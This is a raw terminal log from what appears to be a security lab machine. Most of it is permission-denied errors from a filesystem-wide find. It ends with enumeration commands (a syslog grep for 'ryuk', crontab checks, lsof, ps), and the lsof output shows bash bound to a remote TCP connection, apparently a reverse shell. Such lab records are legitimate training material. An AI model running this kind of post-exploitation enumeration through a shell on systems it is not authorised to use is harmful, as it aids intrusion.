find: `/proc/22/task/22/fd': Permission denied
find: `/proc/22/task/22/fdinfo': Permission denied
find: `/proc/22/task/22/ns': Permission denied
find: `/proc/22/fd': Permission denied
find: `/proc/22/map_files': Permission denied
find: `/proc/22/fdinfo': Permission denied
find: `/proc/22/ns': Permission denied
find: `/proc/23/task/23/fd': Permission denied
find: `/proc/23/task/23/fdinfo': Permission denied
find: `/proc/23/task/23/ns': Permission denied
find: `/proc/23/fd': Permission denied
find: `/proc/23/map_files': Permission denied
find: `/proc/23/fdinfo': Permission denied
find: `/proc/23/ns': Permission denied
find: `/proc/24/task/24/fd': Permission denied
find: `/proc/24/task/24/fdinfo': Permission denied
find: `/proc/24/task/24/ns': Permission denied
find: `/proc/24/fd': Permission denied
find: `/proc/24/map_files': Permission denied
find: `/proc/24/fdinfo': Permission denied
find: `/proc/24/ns': Permission denied
find: `/proc/25/task/25/fd': Permission denied
find: `/proc/25/task/25/fdinfo': Permission denied
find: `/proc/25/task/25/ns': Permission denied
find: `/proc/25/fd': Permission denied
find: `/proc/25/map_files': Permission denied
find: `/proc/25/fdinfo': Permission denied
find: `/proc/25/ns': Permission denied
find: `/proc/26/task/26/fd': Permission denied
find: `/proc/26/task/26/fdinfo': Permission denied
find: `/proc/26/task/26/ns': Permission denied
find: `/proc/26/fd': Permission denied
find: `/proc/26/map_files': Permission denied
find: `/proc/26/fdinfo': Permission denied
find: `/proc/26/ns': Permission denied
find: `/proc/27/task/27/fd': Permission denied
find: `/proc/27/task/27/fdinfo': Permission denied
find: `/proc/27/task/27/ns': Permission denied
find: `/proc/27/fd': Permission denied
find: `/proc/27/map_files': Permission denied
find: `/proc/27/fdinfo': Permission denied
find: `/proc/27/ns': Permission denied
find: `/proc/28/task/28/fd': Permission denied
find: `/proc/28/task/28/fdinfo': Permission denied
find: `/proc/28/task/28/ns': Permission denied
find: `/proc/28/fd': Permission denied
find: `/proc/28/map_files': Permission denied
find: `/proc/28/fdinfo': Permission denied
find: `/proc/28/ns': Permission denied
find: `/proc/30/task/30/fd': Permission denied
find: `/proc/30/task/30/fdinfo': Permission denied
find: `/proc/30/task/30/ns': Permission denied
find: `/proc/30/fd': Permission denied
find: `/proc/30/map_files': Permission denied
find: `/proc/30/fdinfo': Permission denied
find: `/proc/30/ns': Permission denied
find: `/proc/31/task/31/fd': Permission denied
find: `/proc/31/task/31/fdinfo': Permission denied
find: `/proc/31/task/31/ns': Permission denied
find: `/proc/31/fd': Permission denied
find: `/proc/31/map_files': Permission denied
find: `/proc/31/fdinfo': Permission denied
find: `/proc/31/ns': Permission denied
find: `/proc/32/task/32/fd': Permission denied
find: `/proc/32/task/32/fdinfo': Permission denied
find: `/proc/32/task/32/ns': Permission denied
find: `/proc/32/fd': Permission denied
find: `/proc/32/map_files': Permission denied
find: `/proc/32/fdinfo': Permission denied
find: `/proc/32/ns': Permission denied
find: `/proc/33/task/33/fd': Permission denied
find: `/proc/33/task/33/fdinfo': Permission denied
find: `/proc/33/task/33/ns': Permission denied
find: `/proc/33/fd': Permission denied
find: `/proc/33/map_files': Permission denied
find: `/proc/33/fdinfo': Permission denied
find: `/proc/33/ns': Permission denied
find: `/proc/49/task/49/fd': Permission denied
find: `/proc/49/task/49/fdinfo': Permission denied
find: `/proc/49/task/49/ns': Permission denied
find: `/proc/49/fd': Permission denied
find: `/proc/49/map_files': Permission denied
find: `/proc/49/fdinfo': Permission denied
find: `/proc/49/ns': Permission denied
find: `/proc/50/task/50/fd': Permission denied
find: `/proc/50/task/50/fdinfo': Permission denied
find: `/proc/50/task/50/ns': Permission denied
find: `/proc/50/fd': Permission denied
find: `/proc/50/map_files': Permission denied
find: `/proc/50/fdinfo': Permission denied
find: `/proc/50/ns': Permission denied
find: `/proc/51/task/51/fd': Permission denied
find: `/proc/51/task/51/fdinfo': Permission denied
find: `/proc/51/task/51/ns': Permission denied
find: `/proc/51/fd': Permission denied
find: `/proc/51/map_files': Permission denied
find: `/proc/51/fdinfo': Permission denied
find: `/proc/51/ns': Permission denied
find: `/proc/52/task/52/fd': Permission denied
find: `/proc/52/task/52/fdinfo': Permission denied
find: `/proc/52/task/52/ns': Permission denied
find: `/proc/52/fd': Permission denied
find: `/proc/52/map_files': Permission denied
find: `/proc/52/fdinfo': Permission denied
find: `/proc/52/ns': Permission denied
find: `/proc/53/task/53/fd': Permission denied
find: `/proc/53/task/53/fdinfo': Permission denied
find: `/proc/53/task/53/ns': Permission denied
find: `/proc/53/fd': Permission denied
find: `/proc/53/map_files': Permission denied
find: `/proc/53/fdinfo': Permission denied
find: `/proc/53/ns': Permission denied
find: `/proc/54/task/54/fd': Permission denied
find: `/proc/54/task/54/fdinfo': Permission denied
find: `/proc/54/task/54/ns': Permission denied
find: `/proc/54/fd': Permission denied
find: `/proc/54/map_files': Permission denied
find: `/proc/54/fdinfo': Permission denied
find: `/proc/54/ns': Permission denied
find: `/proc/55/task/55/fd': Permission denied
find: `/proc/55/task/55/fdinfo': Permission denied
find: `/proc/55/task/55/ns': Permission denied
find: `/proc/55/fd': Permission denied
find: `/proc/55/map_files': Permission denied
find: `/proc/55/fdinfo': Permission denied
find: `/proc/55/ns': Permission denied
find: `/proc/56/task/56/fd': Permission denied
find: `/proc/56/task/56/fdinfo': Permission denied
find: `/proc/56/task/56/ns': Permission denied
find: `/proc/56/fd': Permission denied
find: `/proc/56/map_files': Permission denied
find: `/proc/56/fdinfo': Permission denied
find: `/proc/56/ns': Permission denied
find: `/proc/57/task/57/fd': Permission denied
find: `/proc/57/task/57/fdinfo': Permission denied
find: `/proc/57/task/57/ns': Permission denied
find: `/proc/57/fd': Permission denied
find: `/proc/57/map_files': Permission denied
find: `/proc/57/fdinfo': Permission denied
find: `/proc/57/ns': Permission denied
find: `/proc/58/task/58/fd': Permission denied
find: `/proc/58/task/58/fdinfo': Permission denied
find: `/proc/58/task/58/ns': Permission denied
find: `/proc/58/fd': Permission denied
find: `/proc/58/map_files': Permission denied
find: `/proc/58/fdinfo': Permission denied
find: `/proc/58/ns': Permission denied
find: `/proc/59/task/59/fd': Permission denied
find: `/proc/59/task/59/fdinfo': Permission denied
find: `/proc/59/task/59/ns': Permission denied
find: `/proc/59/fd': Permission denied
find: `/proc/59/map_files': Permission denied
find: `/proc/59/fdinfo': Permission denied
find: `/proc/59/ns': Permission denied
find: `/proc/60/task/60/fd': Permission denied
find: `/proc/60/task/60/fdinfo': Permission denied
find: `/proc/60/task/60/ns': Permission denied
find: `/proc/60/fd': Permission denied
find: `/proc/60/map_files': Permission denied
find: `/proc/60/fdinfo': Permission denied
find: `/proc/60/ns': Permission denied
find: `/proc/61/task/61/fd': Permission denied
find: `/proc/61/task/61/fdinfo': Permission denied
find: `/proc/61/task/61/ns': Permission denied
find: `/proc/61/fd': Permission denied
find: `/proc/61/map_files': Permission denied
find: `/proc/61/fdinfo': Permission denied
find: `/proc/61/ns': Permission denied
find: `/proc/62/task/62/fd': Permission denied
find: `/proc/62/task/62/fdinfo': Permission denied
find: `/proc/62/task/62/ns': Permission denied
find: `/proc/62/fd': Permission denied
find: `/proc/62/map_files': Permission denied
find: `/proc/62/fdinfo': Permission denied
find: `/proc/62/ns': Permission denied
find: `/proc/65/task/65/fd': Permission denied
find: `/proc/65/task/65/fdinfo': Permission denied
find: `/proc/65/task/65/ns': Permission denied
find: `/proc/65/fd': Permission denied
find: `/proc/65/map_files': Permission denied
find: `/proc/65/fdinfo': Permission denied
find: `/proc/65/ns': Permission denied
find: `/proc/69/task/69/fd': Permission denied
find: `/proc/69/task/69/fdinfo': Permission denied
find: `/proc/69/task/69/ns': Permission denied
find: `/proc/69/fd': Permission denied
find: `/proc/69/map_files': Permission denied
find: `/proc/69/fdinfo': Permission denied
find: `/proc/69/ns': Permission denied
find: `/proc/82/task/82/fd': Permission denied
find: `/proc/82/task/82/fdinfo': Permission denied
find: `/proc/82/task/82/ns': Permission denied
find: `/proc/82/fd': Permission denied
find: `/proc/82/map_files': Permission denied
find: `/proc/82/fdinfo': Permission denied
find: `/proc/82/ns': Permission denied
find: `/proc/83/task/83/fd': Permission denied
find: `/proc/83/task/83/fdinfo': Permission denied
find: `/proc/83/task/83/ns': Permission denied
find: `/proc/83/fd': Permission denied
find: `/proc/83/map_files': Permission denied
find: `/proc/83/fdinfo': Permission denied
find: `/proc/83/ns': Permission denied
find: `/proc/84/task/84/fd': Permission denied
find: `/proc/84/task/84/fdinfo': Permission denied
find: `/proc/84/task/84/ns': Permission denied
find: `/proc/84/fd': Permission denied
find: `/proc/84/map_files': Permission denied
find: `/proc/84/fdinfo': Permission denied
find: `/proc/84/ns': Permission denied
find: `/proc/138/task/138/fd': Permission denied
find: `/proc/138/task/138/fdinfo': Permission denied
find: `/proc/138/task/138/ns': Permission denied
find: `/proc/138/fd': Permission denied
find: `/proc/138/map_files': Permission denied
find: `/proc/138/fdinfo': Permission denied
find: `/proc/138/ns': Permission denied
find: `/proc/139/task/139/fd': Permission denied
find: `/proc/139/task/139/fdinfo': Permission denied
find: `/proc/139/task/139/ns': Permission denied
find: `/proc/139/fd': Permission denied
find: `/proc/139/map_files': Permission denied
find: `/proc/139/fdinfo': Permission denied
find: `/proc/139/ns': Permission denied
find: `/proc/140/task/140/fd': Permission denied
find: `/proc/140/task/140/fdinfo': Permission denied
find: `/proc/140/task/140/ns': Permission denied
find: `/proc/140/fd': Permission denied
find: `/proc/140/map_files': Permission denied
find: `/proc/140/fdinfo': Permission denied
find: `/proc/140/ns': Permission denied
find: `/proc/141/task/141/fd': Permission denied
find: `/proc/141/task/141/fdinfo': Permission denied
find: `/proc/141/task/141/ns': Permission denied
find: `/proc/141/fd': Permission denied
find: `/proc/141/map_files': Permission denied
find: `/proc/141/fdinfo': Permission denied
find: `/proc/141/ns': Permission denied
find: `/proc/142/task/142/fd': Permission denied
find: `/proc/142/task/142/fdinfo': Permission denied
find: `/proc/142/task/142/ns': Permission denied
find: `/proc/142/fd': Permission denied
find: `/proc/142/map_files': Permission denied
find: `/proc/142/fdinfo': Permission denied
find: `/proc/142/ns': Permission denied
find: `/proc/143/task/143/fd': Permission denied
find: `/proc/143/task/143/fdinfo': Permission denied
find: `/proc/143/task/143/ns': Permission denied
find: `/proc/143/fd': Permission denied
find: `/proc/143/map_files': Permission denied
find: `/proc/143/fdinfo': Permission denied
find: `/proc/143/ns': Permission denied
find: `/proc/144/task/144/fd': Permission denied
find: `/proc/144/task/144/fdinfo': Permission denied
find: `/proc/144/task/144/ns': Permission denied
find: `/proc/144/fd': Permission denied
find: `/proc/144/map_files': Permission denied
find: `/proc/144/fdinfo': Permission denied
find: `/proc/144/ns': Permission denied
find: `/proc/145/task/145/fd': Permission denied
find: `/proc/145/task/145/fdinfo': Permission denied
find: `/proc/145/task/145/ns': Permission denied
find: `/proc/145/fd': Permission denied
find: `/proc/145/map_files': Permission denied
find: `/proc/145/fdinfo': Permission denied
find: `/proc/145/ns': Permission denied
find: `/proc/146/task/146/fd': Permission denied
find: `/proc/146/task/146/fdinfo': Permission denied
find: `/proc/146/task/146/ns': Permission denied
find: `/proc/146/fd': Permission denied
find: `/proc/146/map_files': Permission denied
find: `/proc/146/fdinfo': Permission denied
find: `/proc/146/ns': Permission denied
find: `/proc/148/task/148/fd': Permission denied
find: `/proc/148/task/148/fdinfo': Permission denied
find: `/proc/148/task/148/ns': Permission denied
find: `/proc/148/fd': Permission denied
find: `/proc/148/map_files': Permission denied
find: `/proc/148/fdinfo': Permission denied
find: `/proc/148/ns': Permission denied
find: `/proc/154/task/154/fd': Permission denied
find: `/proc/154/task/154/fdinfo': Permission denied
find: `/proc/154/task/154/ns': Permission denied
find: `/proc/154/fd': Permission denied
find: `/proc/154/map_files': Permission denied
find: `/proc/154/fdinfo': Permission denied
find: `/proc/154/ns': Permission denied
find: `/proc/155/task/155/fd': Permission denied
find: `/proc/155/task/155/fdinfo': Permission denied
find: `/proc/155/task/155/ns': Permission denied
find: `/proc/155/fd': Permission denied
find: `/proc/155/map_files': Permission denied
find: `/proc/155/fdinfo': Permission denied
find: `/proc/155/ns': Permission denied
find: `/proc/160/task/160/fd': Permission denied
find: `/proc/160/task/160/fdinfo': Permission denied
find: `/proc/160/task/160/ns': Permission denied
find: `/proc/160/fd': Permission denied
find: `/proc/160/map_files': Permission denied
find: `/proc/160/fdinfo': Permission denied
find: `/proc/160/ns': Permission denied
find: `/proc/161/task/161/fd': Permission denied
find: `/proc/161/task/161/fdinfo': Permission denied
find: `/proc/161/task/161/ns': Permission denied
find: `/proc/161/fd': Permission denied
find: `/proc/161/map_files': Permission denied
find: `/proc/161/fdinfo': Permission denied
find: `/proc/161/ns': Permission denied
find: `/proc/176/task/176/fd': Permission denied
find: `/proc/176/task/176/fdinfo': Permission denied
find: `/proc/176/task/176/ns': Permission denied
find: `/proc/176/fd': Permission denied
find: `/proc/176/map_files': Permission denied
find: `/proc/176/fdinfo': Permission denied
find: `/proc/176/ns': Permission denied
find: `/proc/177/task/177/fd': Permission denied
find: `/proc/177/task/177/fdinfo': Permission denied
find: `/proc/177/task/177/ns': Permission denied
find: `/proc/177/fd': Permission denied
find: `/proc/177/map_files': Permission denied
find: `/proc/177/fdinfo': Permission denied
find: `/proc/177/ns': Permission denied
find: `/proc/221/task/221/fd': Permission denied
find: `/proc/221/task/221/fdinfo': Permission denied
find: `/proc/221/task/221/ns': Permission denied
find: `/proc/221/fd': Permission denied
find: `/proc/221/map_files': Permission denied
find: `/proc/221/fdinfo': Permission denied
find: `/proc/221/ns': Permission denied
find: `/proc/328/task/328/fd': Permission denied
find: `/proc/328/task/328/fdinfo': Permission denied
find: `/proc/328/task/328/ns': Permission denied
find: `/proc/328/fd': Permission denied
find: `/proc/328/map_files': Permission denied
find: `/proc/328/fdinfo': Permission denied
find: `/proc/328/ns': Permission denied
find: `/proc/358/task/358/fd': Permission denied
find: `/proc/358/task/358/fdinfo': Permission denied
find: `/proc/358/task/358/ns': Permission denied
find: `/proc/358/fd': Permission denied
find: `/proc/358/map_files': Permission denied
find: `/proc/358/fdinfo': Permission denied
find: `/proc/358/ns': Permission denied
find: `/proc/377/task/377/fd': Permission denied
find: `/proc/377/task/377/fdinfo': Permission denied
find: `/proc/377/task/377/ns': Permission denied
find: `/proc/377/fd': Permission denied
find: `/proc/377/map_files': Permission denied
find: `/proc/377/fdinfo': Permission denied
find: `/proc/377/ns': Permission denied
find: `/proc/405/task/405/fd': Permission denied
find: `/proc/405/task/405/fdinfo': Permission denied
find: `/proc/405/task/405/ns': Permission denied
find: `/proc/405/fd': Permission denied
find: `/proc/405/map_files': Permission denied
find: `/proc/405/fdinfo': Permission denied
find: `/proc/405/ns': Permission denied
find: `/proc/409/task/409/fd': Permission denied
find: `/proc/409/task/409/fdinfo': Permission denied
find: `/proc/409/task/409/ns': Permission denied
find: `/proc/409/fd': Permission denied
find: `/proc/409/map_files': Permission denied
find: `/proc/409/fdinfo': Permission denied
find: `/proc/409/ns': Permission denied
find: `/proc/421/task/421/fd': Permission denied
find: `/proc/421/task/421/fdinfo': Permission denied
find: `/proc/421/task/421/ns': Permission denied
find: `/proc/421/fd': Permission denied
find: `/proc/421/map_files': Permission denied
find: `/proc/421/fdinfo': Permission denied
find: `/proc/421/ns': Permission denied
find: `/proc/423/task/423/fd': Permission denied
find: `/proc/423/task/423/fdinfo': Permission denied
find: `/proc/423/task/423/ns': Permission denied
find: `/proc/423/task/425/fd': Permission denied
find: `/proc/423/task/425/fdinfo': Permission denied
find: `/proc/423/task/425/ns': Permission denied
find: `/proc/423/task/426/fd': Permission denied
find: `/proc/423/task/426/fdinfo': Permission denied
find: `/proc/423/task/426/ns': Permission denied
find: `/proc/423/task/427/fd': Permission denied
find: `/proc/423/task/427/fdinfo': Permission denied
find: `/proc/423/task/427/ns': Permission denied
find: `/proc/423/fd': Permission denied
find: `/proc/423/map_files': Permission denied
find: `/proc/423/fdinfo': Permission denied
find: `/proc/423/ns': Permission denied
find: `/proc/442/task/442/fd': Permission denied
find: `/proc/442/task/442/fdinfo': Permission denied
find: `/proc/442/task/442/ns': Permission denied
find: `/proc/442/fd': Permission denied
find: `/proc/442/map_files': Permission denied
find: `/proc/442/fdinfo': Permission denied
find: `/proc/442/ns': Permission denied
find: `/proc/590/task/590/fd': Permission denied
find: `/proc/590/task/590/fdinfo': Permission denied
find: `/proc/590/task/590/ns': Permission denied
find: `/proc/590/fd': Permission denied
find: `/proc/590/map_files': Permission denied
find: `/proc/590/fdinfo': Permission denied
find: `/proc/590/ns': Permission denied
find: `/proc/612/task/612/fd': Permission denied
find: `/proc/612/task/612/fdinfo': Permission denied
find: `/proc/612/task/612/ns': Permission denied
find: `/proc/612/fd': Permission denied
find: `/proc/612/map_files': Permission denied
find: `/proc/612/fdinfo': Permission denied
find: `/proc/612/ns': Permission denied
find: `/proc/912/task/912/fd': Permission denied
find: `/proc/912/task/912/fdinfo': Permission denied
find: `/proc/912/task/912/ns': Permission denied
find: `/proc/912/fd': Permission denied
find: `/proc/912/map_files': Permission denied
find: `/proc/912/fdinfo': Permission denied
find: `/proc/912/ns': Permission denied
find: `/proc/915/task/915/fd': Permission denied
find: `/proc/915/task/915/fdinfo': Permission denied
find: `/proc/915/task/915/ns': Permission denied
find: `/proc/915/fd': Permission denied
find: `/proc/915/map_files': Permission denied
find: `/proc/915/fdinfo': Permission denied
find: `/proc/915/ns': Permission denied
find: `/proc/920/task/920/fd': Permission denied
find: `/proc/920/task/920/fdinfo': Permission denied
find: `/proc/920/task/920/ns': Permission denied
find: `/proc/920/fd': Permission denied
find: `/proc/920/map_files': Permission denied
find: `/proc/920/fdinfo': Permission denied
find: `/proc/920/ns': Permission denied
find: `/proc/921/task/921/fd': Permission denied
find: `/proc/921/task/921/fdinfo': Permission denied
find: `/proc/921/task/921/ns': Permission denied
find: `/proc/921/fd': Permission denied
find: `/proc/921/map_files': Permission denied
find: `/proc/921/fdinfo': Permission denied
find: `/proc/921/ns': Permission denied
find: `/proc/922/task/922/fd': Permission denied
find: `/proc/922/task/922/fdinfo': Permission denied
find: `/proc/922/task/922/ns': Permission denied
find: `/proc/922/task/957/fd': Permission denied
find: `/proc/922/task/957/fdinfo': Permission denied
find: `/proc/922/task/957/ns': Permission denied
find: `/proc/922/task/958/fd': Permission denied
find: `/proc/922/task/958/fdinfo': Permission denied
find: `/proc/922/task/958/ns': Permission denied
find: `/proc/922/task/960/fd': Permission denied
find: `/proc/922/task/960/fdinfo': Permission denied
find: `/proc/922/task/960/ns': Permission denied
find: `/proc/922/task/961/fd': Permission denied
find: `/proc/922/task/961/fdinfo': Permission denied
find: `/proc/922/task/961/ns': Permission denied
find: `/proc/922/task/992/fd': Permission denied
find: `/proc/922/task/992/fdinfo': Permission denied
find: `/proc/922/task/992/ns': Permission denied
find: `/proc/922/task/1180/fd': Permission denied
find: `/proc/922/task/1180/fdinfo': Permission denied
find: `/proc/922/task/1180/ns': Permission denied
find: `/proc/922/fd': Permission denied
find: `/proc/922/map_files': Permission denied
find: `/proc/922/fdinfo': Permission denied
find: `/proc/922/ns': Permission denied
find: `/proc/924/task/924/fd': Permission denied
find: `/proc/924/task/924/fdinfo': Permission denied
find: `/proc/924/task/924/ns': Permission denied
find: `/proc/924/fd': Permission denied
find: `/proc/924/map_files': Permission denied
find: `/proc/924/fdinfo': Permission denied
find: `/proc/924/ns': Permission denied
find: `/proc/944/task/944/fd': Permission denied
find: `/proc/944/task/944/fdinfo': Permission denied
find: `/proc/944/task/944/ns': Permission denied
find: `/proc/944/fd': Permission denied
find: `/proc/944/map_files': Permission denied
find: `/proc/944/fdinfo': Permission denied
find: `/proc/944/ns': Permission denied
find: `/proc/945/task/945/fd': Permission denied
find: `/proc/945/task/945/fdinfo': Permission denied
find: `/proc/945/task/945/ns': Permission denied
find: `/proc/945/fd': Permission denied
find: `/proc/945/map_files': Permission denied
find: `/proc/945/fdinfo': Permission denied
find: `/proc/945/ns': Permission denied
find: `/proc/946/task/946/fd': Permission denied
find: `/proc/946/task/946/fdinfo': Permission denied
find: `/proc/946/task/946/ns': Permission denied
find: `/proc/946/fd': Permission denied
find: `/proc/946/map_files': Permission denied
find: `/proc/946/fdinfo': Permission denied
find: `/proc/946/ns': Permission denied
find: `/proc/947/task/947/fd': Permission denied
find: `/proc/947/task/947/fdinfo': Permission denied
find: `/proc/947/task/947/ns': Permission denied
find: `/proc/947/fd': Permission denied
find: `/proc/947/map_files': Permission denied
find: `/proc/947/fdinfo': Permission denied
find: `/proc/947/ns': Permission denied
find: `/proc/999/task/999/fd': Permission denied
find: `/proc/999/task/999/fdinfo': Permission denied
find: `/proc/999/task/999/ns': Permission denied
find: `/proc/999/task/1000/fd': Permission denied
find: `/proc/999/task/1000/fdinfo': Permission denied
find: `/proc/999/task/1000/ns': Permission denied
find: `/proc/999/task/1001/fd': Permission denied
find: `/proc/999/task/1001/fdinfo': Permission denied
find: `/proc/999/task/1001/ns': Permission denied
find: `/proc/999/task/1002/fd': Permission denied
find: `/proc/999/task/1002/fdinfo': Permission denied
find: `/proc/999/task/1002/ns': Permission denied
find: `/proc/999/fd': Permission denied
find: `/proc/999/map_files': Permission denied
find: `/proc/999/fdinfo': Permission denied
find: `/proc/999/ns': Permission denied
find: `/proc/1126/task/1126/fd': Permission denied
find: `/proc/1126/task/1126/fdinfo': Permission denied
find: `/proc/1126/task/1126/ns': Permission denied
find: `/proc/1126/fd': Permission denied
find: `/proc/1126/map_files': Permission denied
find: `/proc/1126/fdinfo': Permission denied
find: `/proc/1126/ns': Permission denied
find: `/proc/1161/task/1161/fd': Permission denied
find: `/proc/1161/task/1161/fdinfo': Permission denied
find: `/proc/1161/task/1161/ns': Permission denied
find: `/proc/1161/fd': Permission denied
find: `/proc/1161/map_files': Permission denied
find: `/proc/1161/fdinfo': Permission denied
find: `/proc/1161/ns': Permission denied
find: `/proc/1181/task/1181/fd': Permission denied
find: `/proc/1181/task/1181/fdinfo': Permission denied
find: `/proc/1181/task/1181/ns': Permission denied
find: `/proc/1181/fd': Permission denied
find: `/proc/1181/map_files': Permission denied
find: `/proc/1181/fdinfo': Permission denied
find: `/proc/1181/ns': Permission denied
find: `/proc/1183/task/1183/fd': Permission denied
find: `/proc/1183/task/1183/fdinfo': Permission denied
find: `/proc/1183/task/1183/ns': Permission denied
find: `/proc/1183/fd': Permission denied
find: `/proc/1183/map_files': Permission denied
find: `/proc/1183/fdinfo': Permission denied
find: `/proc/1183/ns': Permission denied
find: `/proc/1199/task/1199/fd': Permission denied
find: `/proc/1199/task/1199/fdinfo': Permission denied
find: `/proc/1199/task/1199/ns': Permission denied
find: `/proc/1199/fd': Permission denied
find: `/proc/1199/map_files': Permission denied
find: `/proc/1199/fdinfo': Permission denied
find: `/proc/1199/ns': Permission denied
find: `/proc/1266/task/1266/fd': Permission denied
find: `/proc/1266/task/1266/fdinfo': Permission denied
find: `/proc/1266/task/1266/ns': Permission denied
find: `/proc/1266/fd': Permission denied
find: `/proc/1266/map_files': Permission denied
find: `/proc/1266/fdinfo': Permission denied
find: `/proc/1266/ns': Permission denied
find: `/proc/1267/task/1267/fd': Permission denied
find: `/proc/1267/task/1267/fdinfo': Permission denied
find: `/proc/1267/task/1267/ns': Permission denied
find: `/proc/1267/fd': Permission denied
find: `/proc/1267/map_files': Permission denied
find: `/proc/1267/fdinfo': Permission denied
find: `/proc/1267/ns': Permission denied
find: `/proc/1290/task/1290/fd': Permission denied
find: `/proc/1290/task/1290/fdinfo': Permission denied
find: `/proc/1290/task/1290/ns': Permission denied
find: `/proc/1290/fd': Permission denied
find: `/proc/1290/map_files': Permission denied
find: `/proc/1290/fdinfo': Permission denied
find: `/proc/1290/ns': Permission denied
find: `/proc/1292/task/1292/fd': Permission denied
find: `/proc/1292/task/1292/fdinfo': Permission denied
find: `/proc/1292/task/1292/ns': Permission denied
find: `/proc/1292/fd': Permission denied
find: `/proc/1292/map_files': Permission denied
find: `/proc/1292/fdinfo': Permission denied
find: `/proc/1292/ns': Permission denied
find: `/proc/1293/task/1293/fd': Permission denied
find: `/proc/1293/task/1293/fdinfo': Permission denied
find: `/proc/1293/task/1293/ns': Permission denied
find: `/proc/1293/fd': Permission denied
find: `/proc/1293/map_files': Permission denied
find: `/proc/1293/fdinfo': Permission denied
find: `/proc/1293/ns': Permission denied
find: `/proc/1294/task/1294/fd': Permission denied
find: `/proc/1294/task/1294/fdinfo': Permission denied
find: `/proc/1294/task/1294/ns': Permission denied
find: `/proc/1294/fd': Permission denied
find: `/proc/1294/map_files': Permission denied
find: `/proc/1294/fdinfo': Permission denied
find: `/proc/1294/ns': Permission denied
find: `/proc/1296/task/1296/fd': Permission denied
find: `/proc/1296/task/1296/fdinfo': Permission denied
find: `/proc/1296/task/1296/ns': Permission denied
find: `/proc/1296/fd': Permission denied
find: `/proc/1296/map_files': Permission denied
find: `/proc/1296/fdinfo': Permission denied
find: `/proc/1296/ns': Permission denied
find: `/proc/1334/task/1334/fd': Permission denied
find: `/proc/1334/task/1334/fdinfo': Permission denied
find: `/proc/1334/task/1334/ns': Permission denied
find: `/proc/1334/fd': Permission denied
find: `/proc/1334/map_files': Permission denied
find: `/proc/1334/fdinfo': Permission denied
find: `/proc/1334/ns': Permission denied
find: `/proc/1360/task/1360/fd': Permission denied
find: `/proc/1360/task/1360/fdinfo': Permission denied
find: `/proc/1360/task/1360/ns': Permission denied
find: `/proc/1360/fd': Permission denied
find: `/proc/1360/map_files': Permission denied
find: `/proc/1360/fdinfo': Permission denied
find: `/proc/1360/ns': Permission denied
find: `/proc/1379/task/1379/fd': Permission denied
find: `/proc/1379/task/1379/fdinfo': Permission denied
find: `/proc/1379/task/1379/ns': Permission denied
find: `/proc/1379/fd': Permission denied
find: `/proc/1379/map_files': Permission denied
find: `/proc/1379/fdinfo': Permission denied
find: `/proc/1379/ns': Permission denied
find: `/proc/1448/task/1448/fd': Permission denied
find: `/proc/1448/task/1448/fdinfo': Permission denied
find: `/proc/1448/task/1448/ns': Permission denied
find: `/proc/1448/fd': Permission denied
find: `/proc/1448/map_files': Permission denied
find: `/proc/1448/fdinfo': Permission denied
find: `/proc/1448/ns': Permission denied
find: `/proc/1450/task/1450/fd': Permission denied
find: `/proc/1450/task/1450/fdinfo': Permission denied
find: `/proc/1450/task/1450/ns': Permission denied
find: `/proc/1450/fd': Permission denied
find: `/proc/1450/map_files': Permission denied
find: `/proc/1450/fdinfo': Permission denied
find: `/proc/1450/ns': Permission denied
find: `/var/cache/ldconfig': Permission denied
find: `/var/cache/lighttpd/compress/open_siem': Permission denied
find: `/var/cache/lighttpd/compress/dns-details': Permission denied
find: `/var/cache/lighttpd/compress/nebula_files': Permission denied
find: `/var/cache/lighttpd/compress/siem': Permission denied
find: `/var/cache/lighttpd/compress/admin': Permission denied
find: `/var/cache/lighttpd/compress/dist': Permission denied
find: `/var/cache/lighttpd/compress/analyst_files': Permission denied
find: `/var/cache/lighttpd/compress/threat_management': Permission denied
find: `/var/cache/lighttpd/compress/iaim_files': Permission denied
find: `/var/cache/lighttpd/compress/assets': Permission denied
find: `/var/spool/rsyslog': Permission denied
find: `/var/spool/cron/crontabs': Permission denied
find: `/var/spool/cron/atspool': Permission denied
find: `/var/spool/cron/atjobs': Permission denied
find: `/var/lib/polkit-1': Permission denied
find: `/var/lib/amazon': Permission denied
find: `/var/lib/sudo': Permission denied
find: `/var/log': Permission denied

cat /var/log/syslog | grep ryuk
cat: /var/log/syslog: Permission denied

crontab -l
ls -al /var/spool/cron/crontabs
no crontab for guakamole
ls: cannot open directory /var/spool/cron/crontabs: Permission denied


lsof -i :44544
COMMAND  PID      USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
bash    1449 guakamole    0u  IPv4  12162      0t0  TCP ip-10-10-30-139.eu-west-1.compute.internal:44544->ip-10-8-105-111.eu-west-1.compute.internal:44989 (ESTABLISHED)
bash    1449 guakamole    1u  IPv4  12162      0t0  TCP ip-10-10-30-139.eu-west-1.compute.internal:44544->ip-10-8-105-111.eu-west-1.compute.internal:44989 (ESTABLISHED)
bash    1449 guakamole    2u  IPv4  12162      0t0  TCP ip-10-10-30-139.eu-west-1.compute.internal:44544->ip-10-8-105-111.eu-west-1.compute.internal:44989 (ESTABLISHED)
bash    1449 guakamole   37u  IPv4  12162      0t0  TCP ip-10-10-30-139.eu-west-1.compute.internal:44544->ip-10-8-105-111.eu-west-1.compute.internal:44989 (ESTABLISHED)
bash    1451 guakamole    0u  IPv4  12162      0t0  TCP ip-10-10-30-139.eu-west-1.compute.internal:44544->ip-10-8-105-111.eu-west-1.compute.internal:44989 (ESTABLISHED)
bash    1451 guakamole    1u  IPv4  12162      0t0  TCP ip-10-10-30-139.eu-west-1.compute.internal:44544->ip-10-8-105-111.eu-west-1.compute.internal:44989 (ESTABLISHED)
bash    1451 guakamole    2u  IPv4  12162      0t0  TCP ip-10-10-30-139.eu-west-1.compute.internal:44544->ip-10-8-105-111.eu-west-1.compute.internal:44989 (ESTABLISHED)
lsof    2035 guakamole    0u  IPv4  12162      0t0  TCP ip-10-10-30-139.eu-west-1.compute.internal:44544->ip-10-8-105-111.eu-west-1.compute.internal:44989 (ESTABLISHED)
lsof    2035 guakamole    1u  IPv4  12162      0t0  TCP ip-10-10-30-139.eu-west-1.compute.internal:44544->ip-10-8-105-111.eu-west-1.compute.internal:44989 (ESTABLISHED)
lsof    2035 guakamole    2u  IPv4  12162      0t0  TCP ip-10-10-30-139.eu-west-1.compute.internal:44544->ip-10-8-105-111.eu-west-1.compute.internal:44989 (ESTABLISHED)

ps aux --sort=-%cpu | head -n 20
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.3  33484  3908 ?        Ss   09:02   0:04 /sbin/init
